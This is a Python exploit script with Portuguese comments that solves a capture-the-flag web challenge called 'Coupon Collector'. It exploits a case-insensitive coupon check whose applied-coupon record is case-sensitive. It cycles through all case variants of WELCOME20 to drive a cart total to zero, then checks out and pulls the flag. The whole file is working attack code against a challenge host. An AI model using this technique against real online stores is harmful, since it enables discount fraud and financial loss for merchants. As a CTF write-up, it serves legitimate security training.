#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Exploit final do desafio Coupon Collector.

Vulnerabilidade explorada:
A API valida o cupom WELCOME20 ignorando maiúsculas/minúsculas,
mas controla cupons já aplicados usando a string original enviada.

Impacto:
O mesmo cupom pode ser aplicado várias vezes usando variações de case:
WELCOME20, welcome20, Welcome20, WeLcOmE20, etc.

Objetivo:
1. Criar uma sessão limpa.
2. Adicionar um produto ao carrinho.
3. Gerar variações de maiúsculas/minúsculas de WELCOME20.
4. Aplicar cupons até o total ficar zero ou abaixo.
5. Fazer checkout e extrair a flag.
"""

import itertools
import json
import re
import sys
import urllib.error
import urllib.request
import http.cookiejar


TARGET = "https://d1986f8c1c794d65.chal.ctf.ae"


# CookieJar mantém o cookie de sessão automaticamente.
cookie_jar = http.cookiejar.CookieJar()

opener = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(cookie_jar)
)


def request(method, path, body=None):
    """
    Envia uma requisição HTTP para a API mantendo a mesma sessão.

    method:
        GET ou POST.

    path:
        Endpoint, por exemplo /api/cart.

    body:
        Dicionário Python convertido para JSON.
    """

    url = TARGET + path

    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "User-Agent": "coupon-collector-final/1.0",
    }

    data = None

    if body is not None:
        data = json.dumps(body).encode("utf-8")

    req = urllib.request.Request(
        url,
        data=data,
        headers=headers,
        method=method,
    )

    try:
        res = opener.open(req, timeout=10)
        raw = res.read().decode("utf-8", errors="replace")
        return res.status, raw

    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", errors="replace")
        return e.code, raw

    except Exception as e:
        return "ERR", f"{type(e).__name__}: {e}"


def parse_json(raw):
    """
    Tenta converter a resposta em JSON.
    Se não for JSON válido, retorna dicionário vazio.
    """

    try:
        return json.loads(raw)
    except Exception:
        return {}


def generate_case_variants(value):
    """
    Gera todas as combinações de maiúsculas/minúsculas para as letras.

    Exemplo:
        WELCOME20 tem 7 letras.
        2^7 = 128 combinações possíveis.

    Os dígitos 2 e 0 ficam iguais.
    """

    options = []

    for char in value:
        if char.isalpha():
            options.append([char.lower(), char.upper()])
        else:
            options.append([char])

    for combo in itertools.product(*options):
        yield "".join(combo)


def show(title, status, body):
    """
    Imprime uma resposta de forma organizada.
    """

    print()
    print("=" * 80)
    print(title)
    print("=" * 80)
    print(f"HTTP STATUS: {status}")
    print(body)


def main():
    # Inicializa sessão consultando produtos.
    status, body = request("GET", "/api/products")
    show("GET /api/products", status, body)

    # Adiciona um produto ao carrinho.
    # O produto 3 é o Mechanical Keyboard, o mais caro da lista.
    status, body = request("POST", "/api/cart", {"product_id": 3})
    show("POST /api/cart product_id=3", status, body)

    status, body = request("GET", "/api/cart")
    show("GET /api/cart inicial", status, body)

    valid_coupons = []

    # Aplica variações de case até o desconto atingir 100%.
    for coupon in generate_case_variants("WELCOME20"):
        status, body = request("POST", "/api/apply-coupon", {"coupon": coupon})
        data = parse_json(body)

        print()
        print(f"[+] Testando cupom: {coupon!r}")
        print(f"[+] HTTP STATUS: {status}")
        print(f"[+] Resposta: {body}")

        if status == 200 and "discount_percent" in data:
            valid_coupons.append(coupon)

            discount_percent = float(data.get("discount_percent", 0))
            total = float(data.get("total", 999999))

            print(f"[+] Cupom aceito: {coupon}")
            print(f"[+] Desconto atual: {discount_percent}%")
            print(f"[+] Total atual: {total}")

            if total <= 0 or discount_percent >= 100:
                print("[+] Total zerado ou desconto suficiente. Indo para checkout.")
                break

    status, body = request("GET", "/api/cart")
    show("GET /api/cart antes do checkout", status, body)

    status, body = request("POST", "/api/checkout", {})
    show("POST /api/checkout final", status, body)

    print()
    print("=" * 80)
    print("CUPONS VÁLIDOS APLICADOS")
    print("=" * 80)

    for coupon in valid_coupons:
        print(coupon)

    # Extração automática da flag, caso venha no JSON ou em texto puro.
    match = re.search(r"flag\{[^}\r\n]+\}", body, re.IGNORECASE)

    print()
    print("=" * 80)
    print("RESULTADO FINAL")
    print("=" * 80)

    if match:
        flag = match.group(0)
        print(f"[+] FLAG ENCONTRADA: {flag}")

        with open("flag.txt", "w", encoding="utf-8") as f:
            f.write(flag + "\n")

        print("[+] Flag salva em flag.txt")
        return 0

    print("[!] Flag não encontrada automaticamente no corpo da resposta.")
    print("[!] Verifique manualmente o bloco POST /api/checkout final acima.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
